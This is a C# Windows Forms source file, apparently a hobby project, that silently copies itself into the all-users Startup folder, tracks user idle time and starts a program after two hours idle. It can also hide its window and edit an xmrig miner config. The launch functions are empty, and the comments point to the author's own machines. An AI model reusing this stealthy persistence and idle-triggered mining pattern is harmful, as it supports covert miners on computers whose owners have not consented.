using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO; //добавить!

namespace WindowsFormsApp1
{
    public partial class Form1 : Form
    {
        Process srartProg;
        string progStartName;
        bool prog_started;
        string textTranslit;
        int idleTimeOld;

        public Form1()
        {
            InitializeComponent();

            //узнает дату при включерии
            //можно сделать и так, для компактрости
            //*****.Text = DateTime.Now.ToString("yyyy.MM.dd, HH.mm.ss");    
            //Это можно разделять как хочешь. Можно оставить только дату или только время
            label4.Text = DateTime.Now.ToShortDateString() + ", " + DateTime.Now.ToLongTimeString();

            //таймер. Просто таймер, который толкает функцию "tmrShow_Tick"
            Timer tmrShow = new Timer();
            tmrShow.Interval = 1;
            tmrShow.Tick += tmrShow_Tick;
            tmrShow.Enabled = true;


            progStartName= @"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\" + System.AppDomain.CurrentDomain.FriendlyName;

            if (Directory.Exists(progStartName)==false)
            {
                try
                {
                    File.Copy(System.AppDomain.CurrentDomain.FriendlyName, progStartName, true);
                }

                catch (Exception ex)
                {
                   // MessageBox.Show(ex.Message);
                }
            }


            /*
            if (File.Exists(file))
            {
                Encoding enc = Encoding.GetEncoding(1251);
                string[] text = File.ReadAllLines(file, enc);
                foreach (var str in text)
                {
                    if (str.StartsWith(chtoishem) || str.StartsWith(chtoishem.ToLower()))
                        text[i] = nachtomenyaem;
                    i = i + 1;
                    //  str = nachtomenyaem;
                }
                File.WriteAllLines(file, text, enc);
            }
            */



        }
        //C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
        //папка автозагрузки для win7

        //имя строчки, которую надо заменить
        //"worker-id": null







        struct LastInputInfo    //переменная для хранения времени бездействия системы
        {
            public uint cbSize;

            public uint dwTime;
        }

        [DllImport("user32.dll")]   // подключение библиотеки для счёта времени бездействия
        static extern bool GetLastInputInfo(out LastInputInfo plii);    //функыия подсчёта времени бездействия системы

        LastInputInfo lastInputInfo = new LastInputInfo();  //новая переменная для работы с временем бездействия









        private void tmrShow_Tick(object sender, EventArgs e)      //функция счётчика времени
        {
            lastInputInfo.cbSize = (uint)Marshal.SizeOf(lastInputInfo); //присвоение переменной времени бездействия
            GetLastInputInfo(out lastInputInfo);    //вызов функции для обновления переменной времени бездействия

            int idleTime = unchecked(Environment.TickCount - (int)lastInputInfo.dwTime);    //конвертация времени в удобоваримый вариант подсчёта.
                                                                                            //Этот вариант лучше, хотя разницы я не знаю

            label1.Text = Convert.ToString(idleTime);   //вывод времени на лейбу
            label2.Text = DateTime.Now.ToString("HH.mm");

            if (idleTime >= 7200000 && prog_started == false)
            {
                prog_started = true;
                start_prog();
            }
            if (idleTime <= 100 && prog_started == true)
            {
                prog_started = false;
                close_prog();
            }

            if (checkBox1.Checked == true)
            {
                if (idleTime <= 100 && idleTimeOld >= 1000 && prog_started == false)
                {
                    printString(DateTime.Now.ToString("HH.mm.ss") + " Last input.", true);
                }
                idleTimeOld = idleTime;
            }
        }

        private void start_prog()
        { 
            
        }

        private void close_prog()
        { 
        
        }

        private void printString(string s, bool e)
        {
            if (e == false)
            {
                textBox1.Text = s + Environment.NewLine + textBox1.Text;
            }
            else
            {
                textBox1.Text = "¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯" + Environment.NewLine + textBox1.Text;
                textBox1.Text = s + Environment.NewLine + textBox1.Text;
                textBox1.Text = "_______________" + Environment.NewLine + textBox1.Text;
            }

        }
        private void printInt(int s, bool e)
        {
            if (e == false)
            {
                textBox1.Text = s + Environment.NewLine + textBox1.Text;
            }
            else
            {
                textBox1.Text = "¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯" + Environment.NewLine + textBox1.Text;
                textBox1.Text = Convert.ToString(s) + Environment.NewLine + textBox1.Text;
                textBox1.Text = "_______________" + Environment.NewLine + textBox1.Text;
            }
        }


        private void button1_Click(object sender, EventArgs e)  //перезапускает
        {
            Application.Restart();

        }

        private void button2_Click(object sender, EventArgs e)  //стартует какой-то процесс. Нужно указать имя exe файла
        {
            if (prog_started == false)
            {
                srartProg = Process.Start("explorer.exe");
                prog_started = true;
            }
        }

        private void button3_Click(object sender, EventArgs e)  //убивает процесс
        {
            if (prog_started == true)
            {
                Process.GetProcessById(srartProg.Id).Kill();
                prog_started = false;
            }
        }

        private void button4_Click(object sender, EventArgs e)  //прячет программу
        {
            Hide();
        }
        protected override void WndProc(ref Message m)  //события при подключении и отключении усб
        {
            base.WndProc(ref m);
            if (m.WParam.ToInt32() == 0x8000)
                label1.Text = "USB connected!";
            if (m.WParam.ToInt32() == 0x8004)
                label1.Text = "USB  disconnected!";
        }

        private void button5_Click(object sender, EventArgs e)
        {
            label1.Text = DateTime.Now.ToString("yyyy.MM.dd, HH.mm.ss");    //можно разделять как хочешь. Можно оставить только дату или только время
        }

        private void button6_Click(object sender, EventArgs e)
        {
            lastInputInfo.cbSize = (uint)Marshal.SizeOf(lastInputInfo); //присвоение переменной времени бездействия
            GetLastInputInfo(out lastInputInfo);    //вызов функции для обновления переменной времени бездействия
            var idleTime = Environment.TickCount - lastInputInfo.dwTime;    //конвертация времени в удобоваримый вариант подсчёта
            label1.Text = Convert.ToString(idleTime);   //вывод времени на лейбу
        }

        private static string Tr2(string s) //транслитезатор имён. На всякий случай.
        {
            string ret = "";
            string[] rus = {"А","Б","В","Г","Д","Е","Ё","Ж","З","И","Й","К","Л","М","Н","О","П","Р","С","Т","У","Ф","Х","Ц","Ч","Ш","Щ","Ъ","Ы","Ь","Э","Ю","Я",
                            "а","б","в","г","д","е","ё","ж","з","и","й","к","л","м","н","о","п","р","с","т","у","ф","х","ц","ч","ш","щ","ъ","ы","ь","э","ю","я"," "};
            string[] eng = {"A","B","V","G","D","E","E","ZH","Z","I","Y","K","L","M","N","O","P","R","S","T","U","F","KH","TS","CH","SH","SH'","''","Y","'","E","YU","YA",
                            "a","b","v","g","d","e","e","zh","z","i","y","k","l","v","n","o","p","r","s","t","u","f","kh","ts","ch","sh","sh'","''","y","'","e","yu","ya"," "};

            for (int j = 0; j < s.Length; j++)
            {
                for (int i = 0; i < rus.Length; i++)
                {
                    if (s.Substring(j, 1) == rus[i])
                    { 
                        ret += eng[i];
                        break;
                    }
                }
                if (ret.Length<=j) 
                {
                    ret += s.Substring(j, 1);
                }
             
            }
            return ret;
        }

        private void button7_Click(object sender, EventArgs e)
        {
            textTranslit = textBox1.Text;
            textBox1.Text = Tr2(textTranslit);
            label3.Text = Tr2(textTranslit);

        }
        private void stringeditor(string file, string chtoishem, string nachtomenyaem)
        {
            var i = 0;
            if (File.Exists(file))
            {
                Encoding enc = Encoding.GetEncoding(1251);
                string[] text = File.ReadAllLines(file, enc);
                //text = File.ReadAllLines(file);
                foreach (var str in text)
                {
                    if (str.StartsWith(chtoishem) || str.StartsWith(chtoishem.ToLower()))
                        text[i] = nachtomenyaem;
                    i = i + 1;
                    //  str = nachtomenyaem;
                }
                File.WriteAllLines(file, text, enc);
                //File.WriteAllLines(file, text);
                /*
                                for (int j = 0; j < 3; j++)
                                {
                                    textBox1.Text = textBox1.Text + text[j];
                                }
                */
                textBox1.Text = textBox1.Text + text[3];
                //foreach (string s in text)
                //Console.WriteLine(s);
                //textBox1.Text = textBox1.Text + s;
            }
        }

        private void stringeditor2(string file, string chtoishem, string nachtomenyaem)
        {
            if (File.Exists(file))
            {
                Encoding enc = Encoding.GetEncoding(1251);
                string[] text = File.ReadAllLines(file, enc);
                string tex="";
                int length = chtoishem.Length;

                for (int j = 0; j < text.Length; j++)
                {
                    //tex = tex + text[j];

                    for (int n = 0; n < text[j].Length;)
                    {
                        if (text[j].Length - n >= length)
                        {
                            if (text[j].Substring(n, length) == chtoishem)
                            {
                                tex += nachtomenyaem;
                                n += nachtomenyaem.Length;
                            }
                            else
                            {
                                tex += text[j].Substring(n, 1);
                                n++;
                            }
                        }
                        else
                        {
                            tex += text[j].Substring(n, 1);
                            n++;
                        }
                    }
                    text[j] = tex;
                    tex = "";

                    //textBox1.Text = tex;
                    //textBox1.Text = textBox1.Text + text[j];
                }

               /* for(int n=0; n<tex.Length;)
                {
                    if (tex.Length - n >= length)
                    {
                        if (tex.Substring(n, length) == chtoishem)
                        {
                            tex2 += nachtomenyaem;
                            n += nachtomenyaem.Length;
                        }
                        else
                        {
                            tex2 += tex.Substring(n, 1);
                            n++;
                        }
                    }
                    else
                    {
                        tex2 += tex.Substring(n, 1);
                        n++;
                    }
                }
               */

                //textBox1.Text = tex2;
                
                foreach (string s in text)
                tex = tex + s;
                textBox1.Text = tex;



                File.WriteAllLines(file, text, enc);

            }
        }

        private void button9_Click(object sender, EventArgs e)
        {
            //oWerlord для ноутбука, oVerlord для компа
            stringeditor2(@"C:\Users\Owerlord\Desktop\xmrig\config.json", "rigNameeeeeeeeeee", "1111");
        }
    }
}